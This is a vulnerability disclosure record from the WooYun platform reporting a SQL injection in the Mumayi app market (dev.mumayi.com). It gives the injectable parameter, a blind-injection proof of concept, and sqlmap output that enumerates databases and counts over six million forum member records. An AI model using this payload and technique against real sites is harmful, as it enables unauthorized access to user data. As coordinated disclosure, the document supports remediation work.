wybug_title: 木蚂蚁应用市场一处SQL注入涉及600w用户数据
wybug_detail: 漏洞详情 披露状态：   									2015-12-08：	细节已通知厂商并且等待厂商处理中									2015-12-08：	厂商已经确认，细节仅向厂商公开									2015-12-18：	细节向核心白帽子及相关领域专家公开									2015-12-28：	细节向普通白帽子公开									2016-01-07：	细节向实习白帽子公开									2016-01-21：	细节向公众公开  简要描述： 注入，涉及论坛会员数据，有600多万 详细说明：  http://dev.mumayi.com/index/city?pid=2 poc :pid=2 and 1=1mysql数字型盲注back-end DBMS: MySQL 5available databases [4]:[*] information_schema[*] oauth[*] test[*] uc_mumayi其中uc_mumayi是论坛数据库，涉及到600多万的论坛会员数据   漏洞证明：  [07:51:03] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[07:51:03] [INFO] testing MySQL[07:51:03] [INFO] confirming MySQL[07:51:03] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[07:51:03] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select count(*) from uc_mumayi.cdb_uc_members[07:51:09] [INFO] fetching SQL SELECT statement query output: 'select count(*) from uc_mumayi.cdb_uc_members'[07:51:09] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[07:51:09] [INFO] retrieved: 6168046select count(*) from uc_mumayi.cdb_uc_members:    '6168046'   修复方案：  过滤   版权声明：转载请注明来源 greg.wu@乌云
